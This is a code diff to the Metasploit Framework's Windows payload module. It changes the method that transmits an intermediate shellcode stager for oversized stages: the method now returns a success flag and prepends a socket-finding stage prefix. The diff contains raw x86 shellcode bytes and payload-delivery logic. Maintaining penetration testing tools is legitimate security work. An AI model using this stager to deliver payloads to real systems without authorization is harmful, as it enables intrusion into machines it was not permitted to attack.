@@ -64,7 +64,7 @@ module Msf::Payload::Windows
 	# ensure that the entire stage is read in.
 	#
 	def handle_intermediate_stage(conn, payload)
-		return if (payload.length < 512)
+		return false if (payload.length < 512)
 
 		# The mid-stage works by reading in a four byte length in host-byte
 		# order (which represents the length of the stage).  Following that, it
@@ -76,6 +76,10 @@ module Msf::Payload::Windows
 			"\x3c\x01\xee\x55\x89\xe3\x6a\x00\x6a\x04\x53\x57\xff\xd6\x2b\x23" +
 			"\x66\x81\xe4\xfc\xff\x89\xe5\x55\x6a\x00\xff\x33\x55\x57\xff\xd6" +
 			"\x01\xc5\x29\x03\x85\xc0\x75\xf0\xc3"
+
+		# Prepend the stage prefix as necessary, such as a tag that is needed to
+		# find the socket
+		midstager = (self.stage_prefix || '') + midstager
 
 		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
 
@@ -90,6 +94,8 @@ module Msf::Payload::Windows
 		# The mid-stage requires that we transmit a four byte length field that
 		# it will use as the length of the subsequent stage.
 		conn.put([ payload.length ].pack('V'))
+
+		return true
 	end
 
 end
